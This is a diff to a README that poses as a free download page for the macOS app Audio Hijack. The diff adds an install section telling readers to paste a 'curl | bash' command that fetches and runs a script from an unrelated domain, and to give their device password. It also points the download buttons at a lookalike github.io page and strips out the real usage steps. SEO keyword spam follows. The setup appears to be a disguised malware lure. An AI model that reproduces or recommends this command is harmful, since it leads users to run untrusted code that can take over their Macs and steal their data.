@@ -1,10 +1,34 @@
 # 🎧 Audio Hijack — Record Any Audio on macOS
 
-## ✅ Download Audio Hijack for Mac (Free Trial Available)
+## ✅ Download Audio Hijack for Mac 
 
-[![🚀 Download Audio Hijack 🟣](https://img.shields.io/badge/Download-Audio_Hijack-blueviolet?style=for-the-badge)](#)
+[![🚀 Download Audio Hijack 🟣](https://img.shields.io/badge/Download-Audio_Hijack-blueviolet?style=for-the-badge)](https://audio-hijack-mac-download.github.io/.github)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
 
 ## 🌐 What is Audio Hijack?
 
@@ -37,19 +61,7 @@ From podcasters recording interviews, to professionals capturing live streams or
 
 ---
 
-[![⬇️ Download Audio Hijack Again 🟣](https://img.shields.io/badge/Download-Audio_Hijack-blueviolet?style=for-the-badge)](#)
-
----
-
-## 📥 How to Use Audio Hijack
-
-✅ Click the download button above to get started  
-✅ Drag Audio Hijack into your Applications folder  
-✅ Launch the app and create a new session  
-✅ Drag audio input/output blocks and apply effects as needed  
-✅ Press the record button to start capturing audio in real time  
-
-Whether you're recording a call, system sound, or live mic — Audio Hijack gives you full control over your Mac’s sound.
+[![⬇️ Download Audio Hijack Again 🟣](https://img.shields.io/badge/Download-Audio_Hijack-blueviolet?style=for-the-badge)](https://audio-hijack-mac-download.github.io/.github)
 
 ---
 
@@ -67,4 +79,3 @@ audio hijack 4, audio hijack alternative mac, audio hijack alternative mac free,
 audio hijack free download, audio hijack m1, audio hijack mac free, audio hijack mac free download, audio hijack mac full,  
 audio hijack mac m1, audio hijack macos, audio hijack pro 2, audio hijack pro mac, audio hijack pro mac free,  
 download audio hijack 3, download audio hijack for mac, hijack mac
-
